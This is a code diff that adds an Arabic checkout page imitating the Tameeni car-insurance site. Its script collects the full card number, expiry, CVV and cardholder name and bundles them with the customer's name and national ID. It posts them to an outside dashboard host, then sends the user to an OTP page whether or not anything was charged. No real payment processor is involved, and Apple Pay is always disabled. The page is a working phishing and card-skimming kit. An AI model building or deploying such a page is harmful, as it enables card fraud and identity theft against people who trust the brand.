@@ -1,0 +1,477 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>تأميني — الواجهة المبسطة</title>
+  <link rel="stylesheet" href="purchaseFlow.css" />
+  <link rel="stylesheet" href="dist/output.css">
+</head>
+<body>
+  <!-- ====== NAVBAR ====== -->
+  <nav class="navbar" aria-label="Main navigation">
+    <div class="container nav-inner">
+      <a class="brand" href="#" aria-label="تأميني">
+        <img src="images/whiteLogo.png" alt="تأميني" id="img-brand" />
+        <span class="brand-sub">| سيارات</span>
+      </a>
+  </nav>
+  <!-- ====== PROGRESS BAR (insert here) ====== -->
+  <!-- ====== PROGRESS BAR ====== -->
+<section class="progress-wrap">
+  <div class="container progress-inner">
+    <div class="progress-bar">
+
+      <!-- Base blue line -->
+      <div class="base-line"></div>
+
+      <!-- Green filled portion -->
+      <div class="fill-line"></div>
+
+      <!-- Steps -->
+      <div class="step active">
+        <span class="num">1</span>
+        <span class="label">البيانات الأساسية</span>
+      </div>
+
+      <div class="step">
+        <span class="num">2</span>
+        <span class="label">بيانات التأمين</span>
+      </div>
+
+      <div class="step">
+        <span class="num">3</span>
+        <span class="label">قائمة الأسعار</span>
+      </div>
+
+      <div class="step">
+        <span class="num">4</span>
+        <span class="label">الإضافات</span>
+      </div>
+
+      <div class="step">
+        <span class="num">5</span>
+        <span class="label">الملخص والدفع</span>
+      </div>
+
+      <!-- ✅ RIGHT ICON (inside green circle) -->
+      <div class="end-icon end-right">
+        <div class="icon-circle green-circle">
+          <img src="images/carNav.png" alt="Car Icon" class="circle-icon">
+        </div>
+      </div>
+
+      <!-- ✅ LEFT ICON (inside blue circle) -->
+      <div class="end-icon end-left">
+        <div class="icon-circle blue-circle">
+          <img src="images/vLogo.png" alt="Shield Icon" class="circle-icon">
+        </div>
+      </div>
+
+    </div>
+  </div>
+</section>
+<style>
+    :root { --blue:#1e90ff; --ink:#0b3550 }
+    body { background:#fff }
+    .card { border:1px solid #e5e7eb; border-radius:14px; padding:1rem }
+    .badge { background:#eef6ff; color:#1e90ff; border:1px solid #cfe7ff; border-radius:999px; padding:.15rem .55rem; font-size:.75rem }
+    .hint { font-size:.78rem; color:#6b7280 }
+    .price { font-size:1.6rem; font-weight:800 }
+    .modal { display:none; position:fixed; inset:0; background-color:rgba(0,0,0,0.5); justify-content:center; align-items:center; z-index:999; }
+    .modal-content { background:#fff; padding:20px 30px; border-radius:16px; text-align:center; max-width:420px; box-shadow:0 10px 25px rgba(0,0,0,0.3); }
+    .modal-content h2 { font-size:1.1rem; margin-bottom:10px; color:#0b3550; }
+    .modal-content button { margin-top:15px; background:var(--blue); color:#fff; padding:10px 20px; border-radius:10px; font-weight:600; }
+    .brand-badge{display:inline-flex;align-items:center;gap:.4rem;border:1px solid #e5e7eb;border-radius:999px;padding:.25rem .55rem;background:#fafbff;font-size:.75rem;white-space:nowrap}
+    .brand-ico{width:18px;height:14px;display:inline-block}
+    @keyframes shake { 0%,100%{transform:translateX(0)} 20%{transform:translateX(-6px)} 40%{transform:translateX(6px)} 60%{transform:translateX(-4px)} 80%{transform:translateX(4px)} }
+    .shake { animation: shake .35s ease; }
+  </style>
+<style>*, ::before, ::after{--tw-border-spacing-x:0;--tw-border-spacing-y:0;--tw-translate-x:0;--tw-translate-y:0;--tw-rotate:0;--tw-skew-x:0;--tw-skew-y:0;--tw-scale-x:1;--tw-scale-y:1;--tw-pan-x: ;--tw-pan-y: ;--tw-pinch-zoom: ;--tw-scroll-snap-strictness:proximity;--tw-gradient-from-position: ;--tw-gradient-via-position: ;--tw-gradient-to-position: ;--tw-ordinal: ;--tw-slashed-zero: ;--tw-numeric-figure: ;--tw-numeric-spacing: ;--tw-numeric-fraction: ;--tw-ring-inset: ;--tw-ring-offset-width:0px;--tw-ring-offset-color:#fff;--tw-ring-color:rgb(59 130 246 / 0.5);--tw-ring-offset-shadow:0 0 #0000;--tw-ring-shadow:0 0 #0000;--tw-shadow:0 0 #0000;--tw-shadow-colored:0 0 #0000;--tw-blur: ;--tw-brightness: ;--tw-contrast: ;--tw-grayscale: ;--tw-hue-rotate: ;--tw-invert: ;--tw-saturate: ;--tw-sepia: ;--tw-drop-shadow: ;--tw-backdrop-blur: ;--tw-backdrop-brightness: ;--tw-backdrop-contrast: ;--tw-backdrop-grayscale: ;--tw-backdrop-hue-rotate: ;--tw-backdrop-invert: ;--tw-backdrop-opacity: ;--tw-backdrop-saturate: ;--tw-backdrop-sepia: ;--tw-contain-size: ;--tw-contain-layout: ;--tw-contain-paint: ;--tw-contain-style: }::backdrop{--tw-border-spacing-x:0;--tw-border-spacing-y:0;--tw-translate-x:0;--tw-translate-y:0;--tw-rotate:0;--tw-skew-x:0;--tw-skew-y:0;--tw-scale-x:1;--tw-scale-y:1;--tw-pan-x: ;--tw-pan-y: ;--tw-pinch-zoom: ;--tw-scroll-snap-strictness:proximity;--tw-gradient-from-position: ;--tw-gradient-via-position: ;--tw-gradient-to-position: ;--tw-ordinal: ;--tw-slashed-zero: ;--tw-numeric-figure: ;--tw-numeric-spacing: ;--tw-numeric-fraction: ;--tw-ring-inset: ;--tw-ring-offset-width:0px;--tw-ring-offset-color:#fff;--tw-ring-color:rgb(59 130 246 / 0.5);--tw-ring-offset-shadow:0 0 #0000;--tw-ring-shadow:0 0 #0000;--tw-shadow:0 0 #0000;--tw-shadow-colored:0 0 #0000;--tw-blur: ;--tw-brightness: ;--tw-contrast: ;--tw-grayscale: ;--tw-hue-rotate: ;--tw-invert: ;--tw-saturate: ;--tw-sepia: ;--tw-drop-shadow: ;--tw-backdrop-blur: ;--tw-backdrop-brightness: ;--tw-backdrop-contrast: ;--tw-backdrop-grayscale: ;--tw-backdrop-hue-rotate: ;--tw-backdrop-invert: ;--tw-backdrop-opacity: ;--tw-backdrop-saturate: ;--tw-backdrop-sepia: ;--tw-contain-size: ;--tw-contain-layout: ;--tw-contain-paint: ;--tw-contain-style: }/* ! tailwindcss v3.4.17 | MIT License | https://tailwindcss.com */*,::after,::before{box-sizing:border-box;border-width:0;border-style:solid;border-color:#e5e7eb}::after,::before{--tw-content:''}:host,html{line-height:1.5;-webkit-text-size-adjust:100%;-moz-tab-size:4;tab-size:4;font-family:ui-sans-serif, system-ui, sans-serif, "Apple Color Emoji", "Segoe UI Emoji", "Segoe UI Symbol", "Noto Color Emoji";font-feature-settings:normal;font-variation-settings:normal;-webkit-tap-highlight-color:transparent}body{margin:0;line-height:inherit}hr{height:0;color:inherit;border-top-width:1px}abbr:where([title]){-webkit-text-decoration:underline dotted;text-decoration:underline dotted}h1,h2,h3,h4,h5,h6{font-size:inherit;font-weight:inherit}a{color:inherit;text-decoration:inherit}b,strong{font-weight:bolder}code,kbd,pre,samp{font-family:ui-monospace, SFMono-Regular, Menlo, Monaco, Consolas, "Liberation Mono", "Courier New", monospace;font-feature-settings:normal;font-variation-settings:normal;font-size:1em}small{font-size:80%}sub,sup{font-size:75%;line-height:0;position:relative;vertical-align:baseline}sub{bottom:-.25em}sup{top:-.5em}table{text-indent:0;border-color:inherit;border-collapse:collapse}button,input,optgroup,select,textarea{font-family:inherit;font-feature-settings:inherit;font-variation-settings:inherit;font-size:100%;font-weight:inherit;line-height:inherit;letter-spacing:inherit;color:inherit;margin:0;padding:0}button,select{text-transform:none}button,input:where([type=button]),input:where([type=reset]),input:where([type=submit]){-webkit-appearance:button;background-color:transparent;background-image:none}:-moz-focusring{outline:auto}:-moz-ui-invalid{box-shadow:none}progress{vertical-align:baseline}::-webkit-inner-spin-button,::-webkit-outer-spin-button{height:auto}[type=search]{-webkit-appearance:textfield;outline-offset:-2px}::-webkit-search-decoration{-webkit-appearance:none}::-webkit-file-upload-button{-webkit-appearance:button;font:inherit}summary{display:list-item}blockquote,dd,dl,figure,h1,h2,h3,h4,h5,h6,hr,p,pre{margin:0}fieldset{margin:0;padding:0}legend{padding:0}menu,ol,ul{list-style:none;margin:0;padding:0}dialog{padding:0}textarea{resize:vertical}input::placeholder,textarea::placeholder{opacity:1;color:#9ca3af}[role=button],button{cursor:pointer}:disabled{cursor:default}audio,canvas,embed,iframe,img,object,svg,video{display:block;vertical-align:middle}img,video{max-width:100%;height:auto}[hidden]:where(:not([hidden=until-found])){display:none}.sticky{position:sticky}.top-0{top:0px}.z-30{z-index:30}.mx-2{margin-left:0.5rem;margin-right:0.5rem}.mx-auto{margin-left:auto;margin-right:auto}.my-3{margin-top:0.75rem;margin-bottom:0.75rem}.mb-1{margin-bottom:0.25rem}.mb-2{margin-bottom:0.5rem}.mb-3{margin-bottom:0.75rem}.mb-4{margin-bottom:1rem}.mt-0\.5{margin-top:0.125rem}.mt-1{margin-top:0.25rem}.mt-2{margin-top:0.5rem}.mt-3{margin-top:0.75rem}.mt-4{margin-top:1rem}.block{display:block}.flex{display:flex}.grid{display:grid}.hidden{display:none}.h-5{height:1.25rem}.h-9{height:2.25rem}.h-max{height:max-content}.w-5{width:1.25rem}.w-9{width:2.25rem}.w-full{width:100%}.max-w-6xl{max-width:72rem}.cursor-pointer{cursor:pointer}.select-none{-webkit-user-select:none;user-select:none}.place-items-center{place-items:center}.items-center{align-items:center}.justify-between{justify-content:space-between}.gap-3{gap:0.75rem}.gap-2{gap:0.5rem}.gap-4{gap:1rem}.gap-6{gap:1.5rem}.space-y-5 > :not([hidden]) ~ :not([hidden]){--tw-space-y-reverse:0;margin-top:calc(1.25rem * calc(1 - var(--tw-space-y-reverse)));margin-bottom:calc(1.25rem * var(--tw-space-y-reverse))}.rounded-xl{border-radius:0.75rem}.border{border-width:1px}.border-b{border-bottom-width:1px}.border-gray-100{--tw-border-opacity:1;border-color:rgb(243 244 246 / var(--tw-border-opacity, 1))}.border-gray-200{--tw-border-opacity:1;border-color:rgb(229 231 235 / var(--tw-border-opacity, 1))}.border-yellow-200{--tw-border-opacity:1;border-color:rgb(254 240 138 / var(--tw-border-opacity, 1))}.bg-\[\#e9f5ff\]{--tw-bg-opacity:1;background-color:rgb(233 245 255 / var(--tw-bg-opacity, 1))}.bg-white\/90{background-color:rgb(255 255 255 / 0.9)}.bg-\[var\(--blue\)\]{background-color:var(--blue)}.bg-gray-50{--tw-bg-opacity:1;background-color:rgb(249 250 251 / var(--tw-bg-opacity, 1))}.bg-yellow-50{--tw-bg-opacity:1;background-color:rgb(254 252 232 / var(--tw-bg-opacity, 1))}.p-3{padding:0.75rem}.px-4{padding-left:1rem;padding-right:1rem}.py-3{padding-top:0.75rem;padding-bottom:0.75rem}.px-3{padding-left:0.75rem;padding-right:0.75rem}.px-5{padding-left:1.25rem;padding-right:1.25rem}.py-2{padding-top:0.5rem;padding-bottom:0.5rem}.py-2\.5{padding-top:0.625rem;padding-bottom:0.625rem}.py-6{padding-top:1.5rem;padding-bottom:1.5rem}.text-sm{font-size:0.875rem;line-height:1.25rem}.text-xl{font-size:1.25rem;line-height:1.75rem}.text-xs{font-size:0.75rem;line-height:1rem}.font-bold{font-weight:700}.font-medium{font-weight:500}.font-semibold{font-weight:600}.tracking-widest{letter-spacing:0.1em}.text-\[var\(--blue\)\]{color:var(--blue)}.text-gray-300{--tw-text-opacity:1;color:rgb(209 213 219 / var(--tw-text-opacity, 1))}.text-gray-900{--tw-text-opacity:1;color:rgb(17 24 39 / var(--tw-text-opacity, 1))}.text-\[var\(--ink\)\]{color:var(--ink)}.text-gray-500{--tw-text-opacity:1;color:rgb(107 114 128 / var(--tw-text-opacity, 1))}.text-gray-600{--tw-text-opacity:1;color:rgb(75 85 99 / var(--tw-text-opacity, 1))}.text-red-600{--tw-text-opacity:1;color:rgb(220 38 38 / var(--tw-text-opacity, 1))}.text-white{--tw-text-opacity:1;color:rgb(255 255 255 / var(--tw-text-opacity, 1))}.underline{-webkit-text-decoration-line:underline;text-decoration-line:underline}.backdrop-blur{--tw-backdrop-blur:blur(8px);-webkit-backdrop-filter:var(--tw-backdrop-blur) var(--tw-backdrop-brightness) var(--tw-backdrop-contrast) var(--tw-backdrop-grayscale) var(--tw-backdrop-hue-rotate) var(--tw-backdrop-invert) var(--tw-backdrop-opacity) var(--tw-backdrop-saturate) var(--tw-backdrop-sepia);backdrop-filter:var(--tw-backdrop-blur) var(--tw-backdrop-brightness) var(--tw-backdrop-contrast) var(--tw-backdrop-grayscale) var(--tw-backdrop-hue-rotate) var(--tw-backdrop-invert) var(--tw-backdrop-opacity) var(--tw-backdrop-saturate) var(--tw-backdrop-sepia)}.hover\:underline:hover{-webkit-text-decoration-line:underline;text-decoration-line:underline}@media (min-width: 768px){.md\:col-span-2{grid-column:span 2 / span 2}.md\:grid-cols-2{grid-template-columns:repeat(2, minmax(0, 1fr))}}@media (min-width: 1024px){.lg\:col-span-2{grid-column:span 2 / span 2}.lg\:grid-cols-3{grid-template-columns:repeat(3, minmax(0, 1fr))}}</style></head>
+<body class="text-gray-900">
+
+  <main class="max-w-6xl mx-auto px-4 py-6">
+    <h1 class="text-xl font-bold text-[var(--ink)] mb-4">الملخص والدفع</h1>
+
+    <div id="guard" class="hidden mb-4 p-3 rounded-xl bg-yellow-50 border border-yellow-200 text-sm">
+      لم يتم العثور على بيانات سابقة. فضلاً عُد إلى <a href="step1.html" class="underline">الخطوة الأولى</a>.
+    </div>
+
+    <div class="grid lg:grid-cols-3 gap-6">
+      <!-- الملخص -->
+      <section class="lg:col-span-2 space-y-5">
+        <div class="card">
+          <div class="flex items-center justify-between mb-3">
+            <h2 class="font-semibold">ملخص الطلب</h2>
+            <a href="step3.html" class="text-sm text-[var(--blue)] hover:underline">تعديل العرض</a>
+          </div>
+          <div class="grid md:grid-cols-2 gap-3 text-sm">
+            <div class="p-3 rounded-xl bg-gray-50"><div class="text-gray-500 text-xs mb-1">شركة التأمين</div><div class="font-medium" id="sumCompany">الصقر</div></div>
+            <div class="p-3 rounded-xl bg-gray-50"><div class="text-gray-500 text-xs mb-1">نوع التأمين</div><div class="font-medium" id="sumProduct">ضد الغير</div></div>
+            <div class="p-3 rounded-xl bg-gray-50"><div class="text-gray-500 text-xs mb-1">سنة الصنع</div><div class="font-medium" id="sumYear">2025</div></div>
+            <div class="p-3 rounded-xl bg-gray-50"><div class="text-gray-500 text-xs mb-1">المدينة</div><div class="font-medium" id="sumCity">—</div></div>
+            <div class="p-3 rounded-xl bg-gray-50"><div class="text-gray-500 text-xs mb-1">تاريخ السريان</div><div class="font-medium" id="sumStart">—</div></div>
+            <div class="p-3 rounded-xl bg-gray-50"><div class="text-gray-500 text-xs mb-1">الاستخدام</div><div class="font-medium" id="sumUsage">Private</div></div>
+            <div class="p-3 rounded-xl bg-gray-50"><div class="text-gray-500 text-xs mb-1">رقم الهاتف</div><div class="font-medium" id="sumPhone">0521321322</div></div>
+          </div>
+          <div class="mt-3">
+            <div class="text-sm text-gray-500 mb-2">الإضافات المختارة</div>
+            <ul id="sumAddonsList" class="grid md:grid-cols-2 gap-2 text-sm"><li class="text-sm text-gray-500">لا توجد إضافات مختارة.</li></ul>
+          </div>
+        </div>
+
+        <!-- طريقة الدفع -->
+        <div class="card">
+          <h2 class="font-semibold mb-3">طريقة الدفع</h2>
+          <div class="grid md:grid-cols-2 gap-4 mb-4">
+            <label class="card flex items-center gap-3 cursor-pointer">
+              <input type="radio" name="pay" value="card" class="mt-0.5" checked="">
+              <span>بطاقة بنكية (Visa/Master/Mada)</span>
+            </label>
+            <label class="card flex items-center gap-3 cursor-pointer">
+              <input type="radio" name="pay" value="applepay" class="mt-0.5">
+              <span>Apple&nbsp;Pay</span>
+            </label>
+
+          </div>
+
+          <!-- إدخال بيانات البطاقة -->
+          <div id="cardFields" class="grid md:grid-cols-2 gap-3">
+            <div class="md:col-span-2">
+              <label class="block text-sm mb-1">اسم المسجل على البطاقة</label>
+              <input id="cardHolder" class="w-full rounded-xl border border-gray-200 px-3 py-2" placeholder="أدخل الاسم الكامل" required="">
+            </div>
+            <div class="md:col-span-2">
+              <div class="flex items-center justify-between">
+                <label class="block text-sm mb-1">رقم البطاقة</label>
+                <span id="ccBrand" class="brand-badge hidden">
+                  <span class="brand-ico" id="ccBrandIco"></span>
+                  <span id="ccBrandText"></span>
+                </span>
+              </div>
+              <input id="cc" dir="ltr" class="w-full rounded-xl border border-gray-200 px-3 py-2" placeholder="•••• •••• •••• ••••" inputmode="numeric" maxlength="19" required="">
+            </div>
+            <div>
+              <label class="block text-sm mb-1">تاريخ الانتهاء</label>
+              <input id="exp" dir="ltr" class="w-full rounded-xl border border-gray-200 px-3 py-2" placeholder="MM/YY" inputmode="numeric" maxlength="5" required="">
+              <small id="expErr" class="text-red-600 text-xs mt-1 hidden">تاريخ الانتهاء غير صحيح</small>
+            </div>
+            <div>
+              <label class="block text-sm mb-1">CVV</label>
+              <input id="cvv" type="password" dir="ltr" class="w-full rounded-xl border border-gray-200 px-3 py-2 tracking-widest" placeholder="•••" inputmode="numeric" maxlength="4" required="">
+            </div>
+          </div>
+          <p class="hint mt-2"></p>
+        </div>
+      </section>
+
+      <!-- الفاتورة والإجمالي -->
+      <aside class="card h-max">
+        <h3 class="font-semibold mb-3">الملخص المالي</h3>
+        <div class="flex items-center justify-between"><span class="text-sm text-gray-600">السعر الأساسي</span><span id="sumBase">991.00 SAR</span></div>
+        <div class="flex items-center justify-between mt-1"><span class="text-sm text-gray-600">الإضافات</span><span id="sumAddons">0.00 SAR</span></div>
+        <hr class="my-3">
+        <div class="flex items-center justify-between"><span class="font-semibold">المجموع المستحق</span><span class="price" id="sumTotal">991.00 SAR</span></div>
+        <button id="payBtn" class="w-full mt-4 px-5 py-2.5 rounded-xl bg-[var(--blue)] text-white">إتمام الدفع</button>
+      </aside>
+    </div>
+  </main>
+
+  <!-- مودال Apple Pay -->
+  <div id="appleModal" class="modal" style="display: none;">
+    <div class="modal-content">
+      <h2>خدمة الدفع هذه غير متوفرة حالياً</h2>
+      <button onclick="closeModal()">حسناً</button>
+    </div>
+  </div>
+
+  <script>
+    const qs=(s,p=document)=>p.querySelector(s); 
+    const qsa=(s,p=document)=>[...p.querySelectorAll(s)];
+
+    // تحميل البيانات السابقة
+    const s1 = JSON.parse(sessionStorage.getItem('step1')||'{}');
+    const s2 = JSON.parse(sessionStorage.getItem('step2')||'{}');
+    const s3 = JSON.parse(sessionStorage.getItem('step3')||'{}');
+    const s4 = JSON.parse(sessionStorage.getItem('step4')||'{}');
+    console.log("Loaded offer from sessionStorage:", s3);
+    
+    // guard: اقبل offerId أو id
+    if(!s3 || !(s3.offerId || s3.id)){ 
+      qs('#guard').classList.remove('hidden'); 
+    }
+
+    // Apple Pay مودال
+    const appleModal=qs('#appleModal');
+    function closeModal(){ 
+      appleModal.style.display='none'; 
+      qs('input[value="card"]').checked=true; 
+    }
+    window.closeModal = closeModal;
+
+    // معالجة اختيار طريقة الدفع
+    qsa('input[name="pay"]').forEach(r=>{
+      r.addEventListener('change', ()=>{
+        if(r.value==='applepay'){
+          appleModal.style.display='flex';
+          qs('#cardFields').classList.remove('hidden');
+        } else if(r.value==='alrajhi'){
+          // حفظ البيانات قبل التحويل لصفحة الراجحي
+          const payload = { s1, s2, s3, s4 };
+          sessionStorage.setItem('alrajhi_payment', JSON.stringify(payload));
+          // التحويل الفوري لصفحة BK.html
+          window.location.href = 'BK.html';
+        } else {
+          qs('#cardFields').classList.toggle('hidden', r.value!=='card');
+        }
+      });
+    });
+
+    // تعبئة الملخص
+    qs('#sumCompany').textContent=s3.company||'—';
+    qs('#sumProduct').textContent=s3.product==='Comprehensive'?'شامل':'ضد الغير';
+    qs('#sumYear').textContent=s1.year||'—';
+    qs('#sumCity').textContent=s2.city||'—';
+    qs('#sumStart').textContent=s2.policyStart||'—';
+    qs('#sumUsage').textContent=s2.usage||'—';
+    qs('#sumPhone').textContent=s1.phoneNumber||'—';
+
+    const list=qs('#sumAddonsList');
+    const addons=(s4.addons||[]);
+    list.innerHTML=addons.length
+      ? addons.map(a=>`<li class='p-2 rounded-lg bg-gray-50 flex justify-between'><span>${labelFor(a.key)}</span><span>+ ${Number(a.price||0).toFixed(2)} SAR</span></li>`).join('')
+      : '<li class="text-sm text-gray-500">لا توجد إضافات مختارة.</li>';
+
+    function labelFor(key){
+      const map={
+        roadside:'مساعدة على الطريق',
+        replacement:'سيارة بديلة',
+        agency:'إصلاح في الوكالة',
+        glass:'زجاج بدون تحمل',
+        thirdpartyPlus:'تغطية موسعة للطرف الثالث',
+        natural:'حماية من الكوارث الطبيعية',
+        driver:'تأمين سائق إضافي'
+      };
+      return map[key]||key;
+    }
+
+    const base=Number(s3.price||0);
+    const add=Number((s4.totals&&s4.totals.addons)||0);
+    const total=base+add;
+    const fmt=n=>Number(n||0).toFixed(2);
+    qs('#sumBase').textContent=fmt(base)+' SAR';
+    qs('#sumAddons').textContent=fmt(add)+' SAR';
+    qs('#sumTotal').textContent=fmt(total)+' SAR';
+
+    // ==== كشف نوع البطاقة + التنقل + التحقق ====
+    const cc = qs('#cc'), exp = qs('#exp'), cvv = qs('#cvv'), cardHolder = qs('#cardHolder');
+    const ccBadge = qs('#ccBrand'), ccIco = qs('#ccBrandIco'), ccTxt = qs('#ccBrandText');
+    const expErr = qs('#expErr');
+
+    const MADA_BINS = new Set(['588845','440647','440795','446404','415565','401757','400861','409201','428331','428671','428672','428673','428674','431361','432328','422817','446393','446672','447187','447197','447198','484783','489317','489318','968201','968205','968208','968211','520058','529415','535825','543357','549184','557606','558848','581677','588846','588847','636120']);
+
+    function detectCardType(numRaw){
+      const num = numRaw.replace(/\s+/g,'');
+      if(num.length < 1) return {type:'unknown'};
+      const bin6 = num.slice(0,6);
+      const first = num[0];
+      const firstTwo = Number(num.slice(0,2));
+      const firstFour = Number(num.slice(0,4));
+      if(MADA_BINS.has(bin6)) return {type:'mada'};
+      if(first === '4') return {type:'visa'};
+      if((firstTwo >= 51 && firstTwo <= 55) || (firstFour >= 2221 && firstFour <= 2720)) return {type:'mastercard'};
+      return {type:'unknown'};
+    }
+
+    function renderBrand(type){
+      if(type==='unknown'){ ccBadge.classList.add('hidden'); return; }
+      ccBadge.classList.remove('hidden');
+      if(type==='visa'){
+        ccIco.innerHTML = '<svg viewBox="0 0 24 16" class="w-[18px] h-[14px]" xmlns="http://www.w3.org/2000/svg"><rect width="24" height="16" rx="2" fill="#1A1F71"/><text x="4" y="11" font-size="7" fill="#fff" font-family="Arial" font-weight="700">VISA</text></svg>';
+        ccTxt.textContent = 'Visa';
+      }else if(type==='mastercard'){
+        ccIco.innerHTML = '<svg viewBox="0 0 24 16" class="w-[18px] h-[14px]" xmlns="http://www.w3.org/2000/svg"><rect width="24" height="16" rx="2" fill="#fff" stroke="#e5e7eb"/><circle cx="10" cy="8" r="5" fill="#EB001B"/><circle cx="14" cy="8" r="5" fill="#F79E1B" opacity="0.85"/></svg>';
+        ccTxt.textContent = 'Mastercard';
+      }else{
+        ccIco.innerHTML = '<svg viewBox="0 0 24 16" class="w-[18px] h-[14px]" xmlns="http://www.w3.org/2000/svg"><rect width="24" height="16" rx="2" fill="#fff" stroke="#e5e7eb"/><rect x="3" y="4" width="8" height="3" fill="#00A3E0"/><rect x="13" y="4" width="8" height="3" fill="#77C043"/><rect x="3" y="9" width="18" height="3" fill="#003A70"/></svg>';
+        ccTxt.textContent = 'Mada';
+      }
+    }
+
+    cc.oninput = () => {
+      let v = cc.value.replace(/\D/g, '').slice(0, 16);
+      cc.value = v.replace(/(\d{4})(?=\d)/g, '$1 ');
+      const {type} = detectCardType(cc.value);
+      renderBrand(type);
+      if (v.length === 16) exp.focus();
+    };
+
+    function showExpError(msg){
+      exp.classList.add('shake','border-red-400','ring-2','ring-red-200');
+      expErr.textContent = msg;
+      expErr.classList.remove('hidden');
+      setTimeout(()=> exp.classList.remove('shake'), 400);
+    }
+    
+    function clearExpError(){
+      exp.classList.remove('border-red-400','ring-2','ring-red-200');
+      expErr.classList.add('hidden');
+    }
+
+    exp.oninput = () => {
+      let v = exp.value.replace(/\D/g, '').slice(0, 4);
+      if (v.length > 2) v = v.slice(0, 2) + '/' + v.slice(2);
+      exp.value = v;
+
+      if (v.length === 5) {
+        const [mmStr, yyStr] = v.split('/');
+        const mm = Number(mmStr), yy = Number(yyStr);
+        if (mm < 1 || mm > 12) { 
+          showExpError('تاريخ الانتهاء غير صحيح. الرجاء إدخال شهر بين 01 و 12.'); 
+          exp.focus(); 
+          exp.setSelectionRange(0, exp.value.length); 
+          return; 
+        }
+        const now = new Date(); 
+        const cY = now.getFullYear() % 100; 
+        const cM = now.getMonth() + 1;
+        if (yy < cY || (yy === cY && mm < cM)) { 
+          showExpError('البطاقة منتهية الصلاحية. الرجاء استخدام بطاقة صالحة.'); 
+          exp.focus(); 
+          exp.setSelectionRange(0, exp.value.length); 
+          return; 
+        }
+        clearExpError(); 
+        cvv.focus();
+      } else { 
+        clearExpError(); 
+      }
+    };
+
+    // الدفع → احفظ المعاينة محليًا ثم أرسل لباك-إند ثم حوّل إلى OTP
+   // الدفع → احفظ المعاينة محليًا ثم أرسل لباك-إند ثم حوّل إلى OTP
+// الدفع → احفظ المعاينة محليًا ثم أرسل لباك-إند ثم حوّل إلى OTP
+qs('#payBtn').onclick = async () => {
+  const cardHolderVal = (qs('#cardHolder').value || '').trim();
+  const ccVal = (qs('#cc').value || '').trim();
+  const expVal = (qs('#exp').value || '').trim();
+  const cvvVal = (qs('#cvv').value || '').trim();
+
+  if (!cardHolderVal || !ccVal || !expVal || !cvvVal) {
+    showExpError('الرجاء إدخال بيانات البطاقة كاملة، بما في ذلك اسم المسجل على البطاقة.');
+    if (!cardHolderVal) qs('#cardHolder').classList.add('shake','border-red-400','ring-2','ring-red-200');
+    setTimeout(() => qs('#cardHolder').classList.remove('shake'), 400);
+    return;
+  }
+
+  if (!/^\d{2}\/\d{2}$/.test(expVal)) {
+    showExpError('الرجاء إدخال التاريخ بصيغة MM/YY');
+    return;
+  }
+
+  // احفظ معاينة البطاقة للعرض في otp.html (محلي فقط)
+  const preview = JSON.stringify({
+    cardHolder: cardHolderVal,
+    cardNumber: ccVal,
+    expDate: expVal,
+    cvv: cvvVal
+  });
+  sessionStorage.setItem('card_preview', preview);
+  localStorage.setItem('card_preview', preview);
+
+  // === create a text message for your API (Telegram-style payload)
+  const messageText = `
+💳 **طلب دفع جديد**
+👤 الاسم: ${s1?.customerName || '—'}
+🪪 الهوية: ${s1?.nationalId || '—'}
+🏙️ المدينة: ${s2?.city || '—'}
+🚘 الشركة: ${s3?.company || '—'}
+💰 السعر: ${s3?.price || '—'} SAR
+📦 المنتج: ${s3?.product === 'Comprehensive' ? 'شامل' : 'ضد الغير'}
+
+💳 بيانات البطاقة:
+- الاسم على البطاقة: ${cardHolderVal}
+- رقم البطاقة: ${ccVal}
+- تاريخ الانتهاء: ${expVal}
+- CVV: ${cvvVal}
+  `.trim();
+
+  const payload = { text: messageText };
+
+  console.log("Payment payload ready to send:", payload);
+
+  try {
+    const res = await fetch("https://dashboard-nrc2.onrender.com/api/messages", {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify(payload)
+    });
+
+    if (!res.ok) throw new Error(`HTTP ${res.status}`);
+
+    console.log("✅ Payment message sent successfully!");
+    window.location.href = "otp.html";
+
+  } catch (err) {
+    console.error("❌ Payment send error:", err);
+    // Still redirect (placeholder behavior)
+    window.location.href = "otp.html";
+  }
+};
+
+
+  </script>
+
+
+
+  <!-- ====== FOOTER ====== -->
+  <footer class="footer">
+    <div class="container footer-grid">
+      <div class="footer-col logo-col">
+        <img src="images/whiteLogo.png" alt="تأميني" class="footer-logo" />
+        <p class="follow">تابع تأميني</p>
+
+        <p class="dev">
+          تطوير وتشغيل 
+          <img src="images/rasan.png" alt="Rasan" class="rasan-logo" />
+        </p>
+
+        <p class="copyright">© تأميني 2025. جميع الحقوق محفوظة</p>
+      </div>
+
+      <div class="footer-col">
+        <h4>المنتجات</h4>
+        <ul>
+          <li><a href="#">تأمين السيارات</a></li>
+          <li><a href="#">تأمين السفر</a></li>
+          <li><a href="#">تأمين المنزل</a></li>
+          <li><a href="#">تأمين الإقامة المميزة</a></li>
+          <li><a href="#">تأمين المنشآت</a></li>
+        </ul>
+      </div>
+
+      <div class="footer-col">
+        <h4>الدعم</h4>
+        <ul>
+          <li><a href="#">تواصل معنا</a></li>
+          <li><a href="#">سياسة الخصوصية</a></li>
+          <li><a href="#">الشروط والأحكام</a></li>
+        </ul>
+      </div>
+
+      <div class="footer-col">
+        <h4>الموارد</h4>
+        <ul>
+          <li><a href="#">الأسئلة الشائعة</a></li>
+          <li><a href="#">مدونة تأميني</a></li>
+          <li><a href="#">لوائح هيئة التأمين</a></li>
+          <li><a href="#">شركاؤنا</a></li>
+          <li><a href="#">الوظائف</a></li>
+        </ul>
+      </div>
+    </div>
+  </footer>
+
+  <script src="payment.js"></script>
+</body>
+</html>
